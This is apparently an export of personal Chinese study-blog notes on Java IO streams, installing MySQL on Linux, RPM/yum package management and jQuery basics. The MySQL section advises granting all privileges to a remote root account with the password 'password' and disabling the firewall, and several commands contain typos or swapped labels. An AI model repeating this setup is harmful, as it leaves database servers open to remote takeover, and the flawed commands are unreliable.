<h5 id="1-1-单个字符"><a href="#1-1-单个字符" class="headerlink" title="1.1 单个字符"></a>1.1 单个字符</h5><p> read():游标移动,无字节返回-1</p>
<p> read(byte[]a ) 返回的是读取的个数(数组长度够返回文件长度)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>((data=f1.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">	System.out.println((<span class="keyword">char</span>)data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="1-2-多个字符"><a href="#1-2-多个字符" class="headerlink" title="1.2 多个字符"></a>1.2 多个字符</h5><p>​        方法：available():获取流的长度</p>
<p>​        read(byte[] b);</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] b=<span class="keyword">new</span> <span class="keyword">byte</span>[f1.available()];</span><br><span class="line"><span class="keyword">while</span>(f1.read(b)!=-<span class="number">1</span>)&#123;</span><br><span class="line">    System.out.println(<span class="keyword">new</span> String(b)); <span class="comment">//解码</span></span><br><span class="line">    num++;</span><br><span class="line">   <span class="comment">// b=new byte[4];  //清空，不然覆盖后（存在旧字节）</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(num);</span><br></pre></td></tr></table></figure>

<h4 id="2、OutputStream"><a href="#2、OutputStream" class="headerlink" title="2、OutputStream"></a>2、OutputStream</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">OutputStream out=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;F:\\Javacode\\Stream\\output.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>write(int o)</p>
<p>write(byte b[]，int off,int len)off开始偏移量为len,</p>
<p>write(byte[] b)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] b=<span class="string">&quot;hello World!&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>); <span class="comment">//编码</span></span><br><span class="line">out.write(b);</span><br></pre></td></tr></table></figure>

<h4 id="3、文件的拷贝"><a href="#3、文件的拷贝" class="headerlink" title="3、文件的拷贝"></a>3、文件的拷贝</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InputStream f1=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;F:\\Javacode\\Stream\\hh.gif&quot;</span>);</span><br><span class="line">OutputStream o1=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;F:\\Javacode\\Stream\\hhhh.gif&quot;</span>);</span><br><span class="line"><span class="keyword">byte</span>[] b1=<span class="keyword">new</span> <span class="keyword">byte</span>[f1.available()];</span><br><span class="line">f1.read(b1);</span><br><span class="line">o1.write(b1);</span><br></pre></td></tr></table></figure>

<h3 id="2、字符流"><a href="#2、字符流" class="headerlink" title="2、字符流"></a>2、字符流</h3><h4 id="2-1-字符编码"><a href="#2-1-字符编码" class="headerlink" title="2.1 字符编码"></a>2.1 字符编码</h4><p>​        utf-8：英文1个字节，中文3个字节</p>
<pre><code>     GBK:第一个字节为负数，第二个字节可正可负</code></pre>
<p>（1）编码：” “.getBytes(“GBK”);</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String school=<span class="string">&quot;社会&quot;</span>;</span><br><span class="line"><span class="keyword">byte</span>[] b=school.getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>（2）解码：new String(b,”GBK”)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">System.out.println(new String(b,&quot;UTF-8&quot;));</span><br></pre></td></tr></table></figure>

<p>（3）换行：\r\n windows ,\n linux</p>
<h4 id="2-2-Reader"><a href="#2-2-Reader" class="headerlink" title="2.2 Reader"></a>2.2 Reader</h4><p>Reader–&gt;FileReader,定义一个字符数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reader r=<span class="keyword">new</span> FileReader(<span class="string">&quot;F:\\Javacode\\Stream\\reader.txt&quot;</span>);</span><br><span class="line"><span class="keyword">char</span>[] c=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">while</span> (r.read(c)!=-<span class="number">1</span>) &#123;</span><br><span class="line">    System.out.println(c );</span><br><span class="line">    c=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">5</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-3-Writer"><a href="#2-3-Writer" class="headerlink" title="2.3 Writer"></a>2.3 Writer</h4><blockquote>
<p>构造方法：Writer–&gt;FileWriter<strong>存在缓冲区</strong></p>
<p>​        默认是替换模式false，若<strong>追加模式true</strong></p>
<pre><code>    Writer w=new FileWriter(String file,boolean append);</code></pre>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Writer w=<span class="keyword">new</span> FileWriter(<span class="string">&quot;F:\\Javacode\\Stream\\reader.txt&quot;</span>,<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>flush()：刷新缓冲区</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">w.write(<span class="string">&quot;床前明月光&quot;</span>);   <span class="comment">//写入缓冲区</span></span><br><span class="line">w.flush(); <span class="comment">//缺少将无法写入</span></span><br></pre></td></tr></table></figure>



<h3 id="3、缓冲流（高效流）"><a href="#3、缓冲流（高效流）" class="headerlink" title="3、缓冲流（高效流）"></a>3、缓冲流（高效流）</h3><blockquote>
<p>BufferWriter、BufferReader</p>
</blockquote>
<p>存在8k的缓冲区，数据未达到限值，不会写入文件，需要<strong>刷新flush()</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BufferedWriter bw=<span class="keyword">new</span> BufferedWriter(w);</span><br><span class="line">BufferedReader br=<span class="keyword">new</span> BufferedReader(r);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Writer w=<span class="keyword">new</span> FileWriter(<span class="string">&quot;F:\\Javacode\\Stream\\reader.txt&quot;</span>);</span><br><span class="line">BufferedWriter bw=<span class="keyword">new</span> BufferedWriter(w);</span><br><span class="line">bw.write(<span class="string">&quot;春眠不觉晓&quot;</span>);</span><br><span class="line">bw.newLine();</span><br><span class="line">bw.flush();</span><br><span class="line"></span><br><span class="line">Reader r=<span class="keyword">new</span> FileReader(<span class="string">&quot;F:\\Javacode\\Stream\\reader.txt&quot;</span>);</span><br><span class="line">BufferedReader br=<span class="keyword">new</span> BufferedReader(r);</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line=br.readLine())!=<span class="keyword">null</span>)&#123;     <span class="comment">//一次读一行</span></span><br><span class="line">    System.out.println(line);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="4、转换流"><a href="#4、转换流" class="headerlink" title="4、转换流"></a>4、转换流</h3><blockquote>
<p><strong>将字节流转化为字符流</strong></p>
</blockquote>
<h4 id="4-1-InputStreamReader"><a href="#4-1-InputStreamReader" class="headerlink" title="4.1 InputStreamReader"></a>4.1 InputStreamReader</h4><p>​        用于将字节输入流转换为字符流</p>
<p>​        InputStreamReader(InputStream in , String charseName)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;F:\\Javacode\\Stream\\reader.txt&quot;</span>);</span><br><span class="line">Reader r=<span class="keyword">new</span> InputStreamReader(in,<span class="string">&quot;UTF-8&quot;</span>);      <span class="comment">//解码</span></span><br></pre></td></tr></table></figure>

<h4 id="4-2-OutputStreamWriter"><a href="#4-2-OutputStreamWriter" class="headerlink" title="4.2 OutputStreamWriter"></a>4.2 OutputStreamWriter</h4><p>​        用于将字节输出流转换为字符流</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">OutputStream out=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;F:\\Javacode\\Stream\\reader2.txt&quot;</span>);</span><br><span class="line">Writer w=<span class="keyword">new</span> OutputStreamWriter(out,<span class="string">&quot;UTF-8&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="4-3-键盘输入"><a href="#4-3-键盘输入" class="headerlink" title="4.3 键盘输入"></a>4.3 键盘输入</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> BufferReader(<span class="keyword">new</span> InputStreamReader(System.in));</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Scanner input = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">String s = input.nextLine();</span><br><span class="line">input.close();</span><br></pre></td></tr></table></figure>



<h3 id="5、对象流"><a href="#5、对象流" class="headerlink" title="5、对象流"></a>5、对象流</h3><p>   将java对象的基本数据类型和图形写入ObjectOutputStream（支持java.io.Serializable的对象）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">OutputStream out=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;F:\\Javacode\\Stream\\dd.txt&quot;</span>);</span><br><span class="line">ObjectOutputStream objo=<span class="keyword">new</span> ObjectOutputStream(out);</span><br></pre></td></tr></table></figure>

<h4 id="5-1-写入"><a href="#5-1-写入" class="headerlink" title="5.1 写入"></a>5.1 写入</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//逐个写入</span></span><br><span class="line">objo.writeObject(p);</span><br><span class="line">objo.writeObject(p2);</span><br><span class="line">objo.writeObject(p1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用list</span></span><br><span class="line">List&lt;Person&gt; list=<span class="keyword">new</span> ArrayList();</span><br><span class="line">list.add(p);list.add(p1); list.add(p2);</span><br></pre></td></tr></table></figure>

<h4 id="5-2-遍历"><a href="#5-2-遍历" class="headerlink" title="5.2 遍历"></a>5.2 遍历</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person p=(Person) o.readObject();</span><br><span class="line">System.out.println(p);</span><br><span class="line">Person p1=(Person) o.readObject();</span><br><span class="line">System.out.println(p1);</span><br><span class="line">Person p2=(Person) o.readObject();</span><br><span class="line">System.out.println(p2)</span><br><span class="line"></span><br><span class="line">List&lt;Person&gt; list= (List&lt;Person&gt;) o.readObject();</span><br><span class="line">	<span class="keyword">for</span> (Object o1:list) &#123;</span><br><span class="line">		System.out.println(o1);</span><br><span class="line">&#125;</span><br><span class="line">            </span><br><span class="line"> <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line"> 	<span class="keyword">try</span> &#123;</span><br><span class="line"> 		Person p=(Person)o.readObject(); <span class="comment">//指针下移</span></span><br><span class="line"> 		System.out.println(p);</span><br><span class="line">		 &#125;<span class="keyword">catch</span> (EOFException e)&#123;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">	 &#125;</span><br><span class="line"> &#125;</span><br><span class="line">            </span><br></pre></td></tr></table></figure>



<h2 id="三、IO模型"><a href="#三、IO模型" class="headerlink" title="三、IO模型"></a>三、IO模型</h2><h4 id="BIO"><a href="#BIO" class="headerlink" title="BIO"></a>BIO</h4><p>Blocking I/O，同步阻塞IO，数据的读取与写入都必须阻塞在一个线程内等待完成，这种方式在连接数不是特别高的情况下，这种模型比较不错，可以让每个线程都专注于自己的IO，并且编程模型简单，也不用过多的考虑系统的过载、限流等问题。但是面对十万甚至是百万级连接的时候，传统BIO模型是无能为力的，因此需要一些更高效的IO来面对更高的并发量。</p>
<h4 id="NIO"><a href="#NIO" class="headerlink" title="NIO"></a>NIO</h4><p>new I/O,同步非阻塞IO.它是支持面向缓存的，基于通道的IO操作方法。但是其IO行为还是同步的，对于NIO来说，业务线程是在IO操作准备好之后才会得到通知，接着由该线程自行完成IO操作，IO操作本身是同步。</p>
<h4 id="AIO"><a href="#AIO" class="headerlink" title="AIO"></a>AIO</h4><p>Asynchronous IO,是异步非阻塞IO，它是基于事件和回调机制实现的，也是应用操作之后会直接返回，不会阻塞在那里，当后台处理完成后，操作系统会通知相应的线程进行后续的操作。</p>
]]></content>
      <categories>
        <category>javaSe</category>
      </categories>
      <tags>
        <tag>javaSe</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux安装MySQL</title>
    <url>/2020/10/11/03MySql%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="Linux安装MySQL"><a href="#Linux安装MySQL" class="headerlink" title="Linux安装MySQL"></a>Linux安装MySQL</h2><h4 id="1、下载MySql安装包"><a href="#1、下载MySql安装包" class="headerlink" title="1、下载MySql安装包"></a>1、下载MySql安装包</h4><blockquote>
<p><a href="https://dev.mysql.com/downloads/mysql/5.7.html#downloads">https://dev.mysql.com/downloads/mysql/5.7.html#downloads</a></p>
</blockquote>
<h4 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h4><h5 id="2-1-卸载原有mysql"><a href="#2-1-卸载原有mysql" class="headerlink" title="2.1 卸载原有mysql"></a>2.1 卸载原有mysql</h5><blockquote>
<p>[root@localhost ~]# rpm -qa|grep -i mysql<br>perl-DBD-MySQL-4.023-5.el7.x86_64<br>[root@localhost ~]# rpm -e perl-DBD-MySQL-4.023-5.e17.x86_64</p>
</blockquote>
<h5 id="2-2-上传MySql安装包"><a href="#2-2-上传MySql安装包" class="headerlink" title="2.2 上传MySql安装包"></a>2.2 上传MySql安装包</h5><blockquote>
<p>在远程端：alt+p</p>
<p>put  E:/test/MySQL-5.6.22-1.el6.i686.rpm-bundle.tar(安装包的绝对路径)</p>
</blockquote>
<h5 id="2-3-解压MySql的安装包"><a href="#2-3-解压MySql的安装包" class="headerlink" title="2.3 解压MySql的安装包"></a>2.3 解压MySql的安装包</h5><blockquote>
<p>创建存放目录：mkdir MySql</p>
<p>解压：tar -xvf MySQL-5.6.22-1.el6.i686.rpm-bundle.tar -C /root/mysql</p>
</blockquote>
<h5 id="2-4-安装MySql依赖"><a href="#2-4-安装MySql依赖" class="headerlink" title="2.4 安装MySql依赖"></a>2.4 安装MySql依赖</h5><blockquote>
<p>安装：yum -y install libaio.so.1 libgcc_s.so.1 libstdc++.so.6 libncurses.so.5 –setopt=protected_multilib=false</p>
<p>更新：yum  update libstdc++-4.4.7-4.el6.x86_64</p>
</blockquote>
<h5 id="2-5-安装服务端、客户端"><a href="#2-5-安装服务端、客户端" class="headerlink" title="2.5 安装服务端、客户端"></a>2.5 安装服务端、客户端</h5><blockquote>
<p>服务端：rpm -ivh MySQL-client-5.6.22-1.el6.i686.rpm</p>
<p>客户端：rpm -ivh MySQL-server-5.6.22-1.el6.i686.rpm</p>
</blockquote>
<p><strong>问题</strong></p>
<blockquote>
<p>无法启动客户端server：</p>
<ol>
<li><p>wget命令：yum -y install wget </p>
</li>
<li><p>创建存放安装文件：mkdir mysql-server , cd mysql-server</p>
</li>
<li><p>下载mysql的<strong>repo包</strong>：wget <a href="http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm">http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm</a></p>
</li>
<li><p>安装 ：rpm -ivh mysql-community-release-el7-5.noarch.rpm</p>
<p>​             yum install mysql-server</p>
</li>
</ol>
</blockquote>
<h4 id="3、启动MySql服务"><a href="#3、启动MySql服务" class="headerlink" title="3、启动MySql服务"></a>3、启动MySql服务</h4><h5 id="3-1-启动"><a href="#3-1-启动" class="headerlink" title="3.1 启动"></a>3.1 启动</h5><blockquote>
<p>启动数据库：systemctl start mysqld.service</p>
<p>登录：mysql -u root -p  密码：默认为空</p>
</blockquote>
<h5 id="3-2-修改权限"><a href="#3-2-修改权限" class="headerlink" title="3.2 修改权限"></a>3.2 修改权限</h5><blockquote>
<p>连接数据库：修改权限，刷新</p>
<p>grant all privileges on <em>.</em> to ‘root’ @’%’ identified by ‘password’;</p>
<p>flush privileges;</p>
</blockquote>
<h5 id="3-3-存在连接问题解决"><a href="#3-3-存在连接问题解决" class="headerlink" title="3.3 存在连接问题解决"></a>3.3 存在连接问题解决</h5><blockquote>
<p>无法连接问题解决</p>
<ul>
<li>关闭Linux防火墙：systemctl stop firewald.service</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>MySql</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux软件包管理</title>
    <url>/2020/10/11/02%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h4 id="软件包管理"><a href="#软件包管理" class="headerlink" title="软件包管理"></a>软件包管理</h4><h4 id="1、软件包分类"><a href="#1、软件包分类" class="headerlink" title="1、软件包分类"></a>1、软件包分类</h4><ul>
<li>源码包（脚本安装包）</li>
<li>二进制包（RPM包、系统默认包）</li>
</ul>
<p><strong>RPM命名规则</strong></p>
<blockquote>
<p>httpd-2.2.15-15.e16.centos.1.i686.rpm</p>
<p>包名-版本-版本发布次数-适合的Linux平台-适合的硬件平台-rpm扩展名</p>
</blockquote>
<h4 id="2、RPM命令管理"><a href="#2、RPM命令管理" class="headerlink" title="2、RPM命令管理"></a>2、RPM命令管理</h4><blockquote>
<p>问题：依赖性</p>
</blockquote>
<h5 id="1-1-RPM包依赖性"><a href="#1-1-RPM包依赖性" class="headerlink" title="1.1 RPM包依赖性"></a>1.1 RPM包依赖性</h5><blockquote>
<p>树形依赖：a-b-c</p>
<p>环形依赖：a-b-c-a</p>
<p>模块依赖：<a href="http://www.rpmfind.net/">www.rpmfind.net</a></p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201016180147333.png" alt="image-20201016180147333" style="zoom:80%;" />



<h5 id="1-2-包全名和包名"><a href="#1-2-包全名和包名" class="headerlink" title="1.2 包全名和包名"></a>1.2 包全名和包名</h5><blockquote>
<p>包全名：操作的包是没有安装的软件包时，使用包全包。而且要注意路径</p>
<p>包名：操作已经安装的软件包，使用包名是，是搜索<code>/var/lib/rpm/</code>中的数据库</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201016181334820.png" alt="image-20201016181334820" style="zoom:80%;" />



<ul>
<li><strong>rpm安装升级卸载都要在packages下运行</strong></li>
</ul>
<h5 id="1-3-RPM安装"><a href="#1-3-RPM安装" class="headerlink" title="1.3 RPM安装"></a>1.3 RPM安装</h5><blockquote>
<p>rpm -ivh 包全包</p>
<p>选项：-i(install)  安装</p>
<p>​            -v(verbose)  显示详细信息</p>
<p>​            -h(hash)  显示进度</p>
</blockquote>
<h5 id="1-4-RPM包升级"><a href="#1-4-RPM包升级" class="headerlink" title="1.4 RPM包升级"></a>1.4 RPM包升级</h5><blockquote>
<p>rpm -Uvh 包全名</p>
<p>选型：-U(upgrage)  升级</p>
</blockquote>
<h5 id="1-5-卸载"><a href="#1-5-卸载" class="headerlink" title="1.5 卸载"></a>1.5 卸载</h5><blockquote>
<p>rpm -e 包名 卸载</p>
<p>选项： -e 卸载</p>
</blockquote>
<h5 id="1-6-查询"><a href="#1-6-查询" class="headerlink" title="1.6 查询"></a>1.6 查询</h5><blockquote>
<ul>
<li><p>rpm -q 包名 查询是否安装</p>
</li>
<li><p>rqm -qa 查询所有已经安装的rpm包</p>
</li>
<li><p>rqm -qi 包名 查询软件详细信息。</p>
</li>
</ul>
<p>​                -pi 包全名 查看未安装包信息</p>
<ul>
<li><p>rqm -ql 包名 查看包中文件安装位置</p>
</li>
<li><p>rqm -qf 系统文件名  -f 查询系统文件属于哪一个软件包</p>
</li>
<li><p>rqm -qR 包名   -R 查询软件包的依赖性</p>
<p>​                          -p 查询未安装包</p>
</li>
</ul>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201016184525261.png" alt="image-20201016184525261" style="zoom:80%;" />



<h5 id="1-7-校验"><a href="#1-7-校验" class="headerlink" title="1.7 校验"></a>1.7 校验</h5><blockquote>
<p>rpm -V 已安装包名  -V 校验指定RPM包中文件是否被修改</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201016184749532.png" alt="image-20201016184749532" style="zoom:80%;" />

<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201016202738096.png" alt="image-20201016202738096" style="zoom:80%;" />

<h5 id="1-9-文件提取"><a href="#1-9-文件提取" class="headerlink" title="1.9 文件提取"></a>1.9 文件提取</h5><blockquote>
<p>rpm2cpio 包全名 | cpio -idv .文件绝对路径</p>
<p>​        rpm2cpio：2(to)  #将rpm包转换未cpio格式的命令  </p>
<p>​        cpio: 标准工具，用于创建软件档案文件和从档案文件中提取文件</p>
<p>cpio 选项 &lt;[文件| 设备]</p>
</blockquote>
<h4 id="3、yum在线管理"><a href="#3、yum在线管理" class="headerlink" title="3、yum在线管理"></a>3、yum在线管理</h4><h5 id="1、常用yum命令"><a href="#1、常用yum命令" class="headerlink" title="1、常用yum命令"></a>1、常用yum命令</h5><h6 id="1-1-查询"><a href="#1-1-查询" class="headerlink" title="1.1 查询"></a>1.1 查询</h6><blockquote>
<p>yum list 查询所有可用软件包列表</p>
<p>yum search 关键字</p>
</blockquote>
<h6 id="1-2-安装"><a href="#1-2-安装" class="headerlink" title="1.2 安装"></a>1.2 安装</h6><blockquote>
<p>yum -y install 包名</p>
<p>​        -y 自动回答yes  install 安装</p>
</blockquote>
<blockquote>
<p>yum -y install gcc 安装编译器</p>
</blockquote>
<h6 id="1-3-升级"><a href="#1-3-升级" class="headerlink" title="1.3 升级"></a>1.3 升级</h6><blockquote>
<p>yum -y update 包名      </p>
</blockquote>
<h6 id="1-4-卸载"><a href="#1-4-卸载" class="headerlink" title="1.4 卸载"></a>1.4 卸载</h6><blockquote>
<p>yum -y remove 包名   </p>
<ul>
<li>a-b-c 先卸载c</li>
<li>不要轻易使用</li>
</ul>
</blockquote>
<h5 id="2、yum软件组管理命令"><a href="#2、yum软件组管理命令" class="headerlink" title="2、yum软件组管理命令"></a>2、yum软件组管理命令</h5><blockquote>
<p>yum grouplist </p>
<p>yum groupinstall 安装软件包组</p>
</blockquote>
<h5 id="3、光盘yum源"><a href="#3、光盘yum源" class="headerlink" title="3、光盘yum源"></a>3、光盘yum源</h5><h6 id="3-1-挂载光盘"><a href="#3-1-挂载光盘" class="headerlink" title="3.1 挂载光盘"></a>3.1 挂载光盘</h6><blockquote>
<p>mount /dev/cdroom /mnt/cdroom(光盘挂载点)</p>
</blockquote>
<h6 id="3-2-让网络yum源文件失效"><a href="#3-2-让网络yum源文件失效" class="headerlink" title="3.2 让网络yum源文件失效"></a>3.2 让网络yum源文件失效</h6><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201017160533971.png" alt="image-20201017160533971" style="zoom:80%;" />

<blockquote>
<p>mv CentOS-Base.repo  CentOS-Base.repo.bak</p>
<p>mv CentOS-Debuginfo.repo  CentOS-Debuginfo.repo.bak</p>
<p>mv CentOS-Vault.repo  CentOS-Vault.repo.bak</p>
</blockquote>
<h6 id="3-3-修改光盘yum源文件"><a href="#3-3-修改光盘yum源文件" class="headerlink" title="3.3 修改光盘yum源文件"></a>3.3 修改光盘yum源文件</h6><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201017160753271.png" alt="image-20201017160753271" style="zoom:80%;" />



<h4 id="4、源码包"><a href="#4、源码包" class="headerlink" title="4、源码包"></a>4、源码包</h4><h5 id="4-1-区别"><a href="#4-1-区别" class="headerlink" title="4.1 区别"></a>4.1 区别</h5><blockquote>
<p>安装之前：概念上的区别</p>
<p>安装之后：安装位置不同</p>
</blockquote>
<h6 id="RPM包安装位置"><a href="#RPM包安装位置" class="headerlink" title="RPM包安装位置"></a>RPM包安装位置</h6><ul>
<li>安装在默认位置</li>
</ul>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201017161811830.png" alt="image-20201017161811830" style="zoom:80%;" />

<ul>
<li>位置影响，可以使用系统服务管理命令(service)来管理<ul>
<li>例：RPM安装apache启动<ul>
<li>/etc/rc.d/init.d/httpd start</li>
<li>systemctl start httpd  (在网页中输入ip地址)</li>
</ul>
</li>
</ul>
</li>
</ul>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201017162729226.png" alt="image-20201017162729226" style="zoom:80%;" />

<h6 id="源码包安装位置"><a href="#源码包安装位置" class="headerlink" title="源码包安装位置"></a>源码包安装位置</h6><ul>
<li><p>安装在指定位置中，一般是/usr/local/软件名</p>
</li>
<li><p><strong>不能通过系统服务管理命令启动，而使用绝对路径进行服务的管理</strong></p>
</li>
</ul>
<h5 id="4-2-源码包安装"><a href="#4-2-源码包安装" class="headerlink" title="4.2 源码包安装"></a>4.2 源码包安装</h5><blockquote>
<ul>
<li>安装C语言编译器  yum -y gcc</li>
<li>下载源码包 <a href="http://mirror.bit.edu.cn/apache/httpd/">http://mirror.bit.edu.cn/apache/httpd/</a></li>
</ul>
</blockquote>
<blockquote>
<p>源码包保存位置：/usr/local/src/</p>
<p>软件安装位置 ： /usr/local</p>
</blockquote>
<blockquote>
<ul>
<li>下载源码包(使用winSCP上传源码包到Linux)</li>
<li>解压缩 tar -xzvf …..</li>
<li>进入解压缩目录：cd httpd-2.4.46</li>
</ul>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201017165711312.png" alt="image-20201017165711312" style="zoom:80%;" />

<blockquote>
<p>./configure 软件配置与检查</p>
<ul>
<li>定义需要的功能选项</li>
<li>检测系统环境是否符合安装要求</li>
<li>把定义好的功能选项和检测系统环境的信息都写入Makefile文件，用于后续的编辑</li>
</ul>
<p>make 编译</p>
<ul>
<li>make clean</li>
</ul>
<p>make install 编译安装</p>
<p>/usr/loacl/apache2/bin/apachectl start 启动</p>
<p>当端口被占用：service httpd stop</p>
</blockquote>
<blockquote>
<p>无卸载命令，直接删除目录即可，不会产生垃圾</p>
</blockquote>
<h4 id="5、脚本安装包"><a href="#5、脚本安装包" class="headerlink" title="5、脚本安装包"></a>5、脚本安装包</h4><blockquote>
<p>并不是独立的软件包类型，常见安装的是源码包</p>
<p>认为把<strong>安装过程写成自动安装的脚本，只要执行脚本，定义简单的参数，就可以完成安装。</strong></p>
</blockquote>
<h5 id="5-1-Webmin"><a href="#5-1-Webmin" class="headerlink" title="5.1 Webmin"></a>5.1 Webmin</h5><blockquote>
<p>基于Web的linux系统管理界面，通过图形化的方式设置用户账号、Apache、DNS、文件共享等服务</p>
</blockquote>
<blockquote>
<p><a href="http://sourceforge.net/projects/webadmin/files/webmin/">http://sourceforge.net/projects/webadmin/files/webmin/</a></p>
<ul>
<li>解压缩</li>
<li>进入目录</li>
<li>安装./setup.sh</li>
</ul>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201017213845842.png" alt="image-20201017213845842" style="zoom:80%;" />

<blockquote>
<p><strong>[admin@localhost ~]$ su root</strong><br>Password:<br>[root@localhost admin]# ls<br>Desktop  Documents  Downloads  Firewall  Music  Pictures  Public  Templates  Videos<br><strong>[root@localhost admin]# ls /root</strong><br>anaconda-ks.cfg                         mysql-server<br>httpd-2.4.46                            MySQL-server-5.6.22-1.el6.i686.rpm<br>httpd-2.4.46.tar.gz                     MySQL-shared-5.6.22-1.el6.i686.rpm<br>initial-setup-ks.cfg                    MySQL-shared-compat-5.6.22-1.el6.i686.rpm<br>mysql                                   MySQL-test-5.6.22-1.el6.i686.rpm<br>MySQL-5.6.22-1.el6.i686.rpm-bundle.tar  original-ks.cfg<br>MySQL-client-5.6.22-1.el6.i686.rpm      usermin-webmail-1.510<br>MySQL-devel-5.6.22-1.el6.i686.rpm       usermin-webmail-1.510.tar.gz<br>MySQL-embedded-5.6.22-1.el6.i686.rpm<br><strong>[root@localhost admin]# cd /root</strong><br>[root@localhost ~]# cd usermin-webmail-1.510/</p>
</blockquote>
<img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201017215430688.png" alt="image-20201017215430688" style="zoom:80%;" />

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>jquery</title>
    <url>/2020/09/11/04jQuery/</url>
    <content><![CDATA[<h2 id="JQuery"><a href="#JQuery" class="headerlink" title="JQuery"></a>JQuery</h2><p><strong>jQuery对象通过选择器获取</strong></p>
<p>语法：**$(“选择器”)== jQuery(“选择器”)**</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> content=<span class="string">&quot;&lt;p&gt;&lt;span&gt;用户&quot;</span>+count+<span class="string">&quot;:&lt;/span&gt;&quot;</span>+$(<span class="string">&quot;#text&quot;</span>).val()+<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="一、动画效果"><a href="#一、动画效果" class="headerlink" title="一、动画效果"></a>一、动画效果</h2><p><strong>利用可见性过滤</strong></p>
<h4 id="1、淡入和淡出"><a href="#1、淡入和淡出" class="headerlink" title="1、淡入和淡出"></a>1、淡入和淡出</h4><blockquote>
<p>fadeIn() fadeOut() fadeTo()</p>
</blockquote>
<p>css<strong>设置为不可见</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;ad.jpg&quot; style=&quot;display:none&quot;/&gt;</span><br></pre></td></tr></table></figure>

